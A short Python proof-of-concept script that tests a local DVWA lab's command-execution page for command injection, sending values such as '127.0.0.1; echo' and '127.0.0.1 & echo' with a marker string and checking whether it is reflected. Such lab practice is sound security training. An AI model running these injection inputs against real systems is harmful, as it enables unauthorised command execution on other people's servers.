import json
import pathlib
import requests

TARGET = 'http://127.0.0.1/dvwa/vulnerabilities/exec/index.php'
SESSION_FILE = pathlib.Path('local_session.json')
MARKER = 'LAB_POC_MARKER_5E9A'

def load_session():
    return json.loads(SESSION_FILE.read_text(encoding='utf-8'))

def send(ip_value):
    session = load_session()
    cookies = {'PHPSESSID': session['PHPSESSID'], 'security': session.get('security', 'low')}
    data = {'ip': ip_value, 'Submit': 'Submit'}
    resp = requests.post(TARGET, data=data, cookies=cookies, timeout=15)
    return resp.status_code, resp.text

def check(label, ip_value):
    status, body = send(ip_value)
    print('[%s] HTTP %s' % (label, status))
    print('[%s] marker reflected: %s' % (label, MARKER in body))

if __name__ == '__main__':
    check('baseline', '127.0.0.1')
    check('linux-inject', '127.0.0.1; echo ' + MARKER)
    check('windows-inject', '127.0.0.1 & echo ' + MARKER)
